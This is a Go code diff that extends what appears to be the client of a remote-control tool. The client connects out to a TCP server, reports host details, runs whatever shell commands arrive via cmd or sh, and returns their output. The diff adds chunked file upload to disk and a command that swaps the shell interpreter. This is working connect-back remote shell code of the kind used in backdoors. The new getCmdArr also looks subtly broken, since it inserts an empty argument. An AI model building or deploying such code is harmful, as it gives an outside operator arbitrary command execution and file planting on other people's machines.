@@ -19,6 +19,8 @@ import (
 	"github.com/google/uuid"
 )
 
+var gcmds []string
+
 var guuid string
 
 func init() {
@@ -175,8 +177,34 @@ func client() {
 	}
 }
 
+func storeFile(fileName string, fileData []byte) error {
+	pfile, err := os.OpenFile(fileName, os.O_WRONLY|os.O_CREATE|os.O_EXCL, 0666)
+	if err != nil {
+		return err
+	}
+	defer pfile.Close()
+	_, err = pfile.Write(fileData)
+	return err
+}
+
+func tryStoreFileForMulti(fileName string, fileData []byte) error {
+	var err error
+	err = storeFile(fileName, fileData)
+	if err == nil {
+		return nil
+	}
+	for i := 1; i < 10; i++ {
+		tmpName := fmt.Sprintf("%s.%d", fileName, i)
+		err = storeFile(tmpName, fileData)
+		if err == nil {
+			break
+		}
+	}
+	return err
+}
+
 func session(address string) {
-	conn, err := net.DialTimeout("tcp", address, 12*time.Second)
+	conn, err := net.DialTimeout("tcp", address, 30*time.Second)
 	if err != nil {
 		return
 	}
@@ -186,14 +214,33 @@ func session(address string) {
 	if err := sendInfo(conn, pencoder); err != nil {
 		return
 	}
+	var fileName string
+	var fileData []byte
 	for {
-		emsg, err := util.TcpReadMsg(conn, 12*time.Second)
+		emsg, err := util.TcpReadMsg(conn, 60*time.Second)
 		if err != nil {
 			break
 		}
 		msg, err := pdecoder.Decode(emsg)
 		if err != nil {
 			break
+		}
+		if len(msg) >= 3 && msg[0] == 'u' && msg[1] == 'p' && msg[2] == ' ' {
+			if len(fileName) == 0 {
+				fileName = strings.TrimSpace(string(msg[2:]))
+			} else {
+				if len(msg) == 3 {
+					err := tryStoreFileForMulti(fileName, fileData)
+					fileName = ""
+					fileData = nil
+					if err != nil {
+						util.TcpWriteMsg(conn, pencoder.Encode([]byte(err.Error())))
+					}
+				} else {
+					fileData = append(fileData, msg[3:]...)
+				}
+			}
+			continue
 		}
 		var req util.Request
 		if err := json.Unmarshal(msg, &req); err != nil {
@@ -212,6 +259,11 @@ func session(address string) {
 		}
 		if strings.HasPrefix(cmdstr, "createprocess ") {
 			createprocess(cmdstr)
+			continue
+		}
+		if strings.HasPrefix(cmdstr, "setcmdshell ") {
+			tmp := strings.TrimSpace(cmdstr[strings.Index(cmdstr, " "):])
+			gcmds = strings.Split(tmp, " ")
 			continue
 		}
 		out, err := execCmd(cmdstr)
@@ -233,13 +285,25 @@ func createprocess(cmd string) {
 	go execCmd(cmd)
 }
 
-func execCmd(cmdstr string) ([]byte, error) {
-	var cmd *exec.Cmd
-	if runtime.GOOS == "windows" {
-		cmd = exec.Command("cmd", "/c", cmdstr)
-	} else {
-		cmd = exec.Command("sh", "-c", cmdstr)
+func getCmdArr(arg string) []string {
+	if len(gcmds) != 0 {
+		tmp := make([]string, len(gcmds)+1)
+		copy(tmp, gcmds)
+		tmp = append(tmp, arg)
+		return tmp
 	}
+	var tmp []string
+	if runtime.GOOS == "windows" {
+		tmp = append(tmp, "cmd", "/c", arg)
+	} else {
+		tmp = append(tmp, "sh", "-c", arg)
+	}
+	return tmp
+}
+
+func execCmd(cmdstr string) ([]byte, error) {
+	arr := getCmdArr(cmdstr)
+	cmd := exec.Command(arr[0], arr[1:]...)
 	return cmd.CombinedOutput()
 }
 
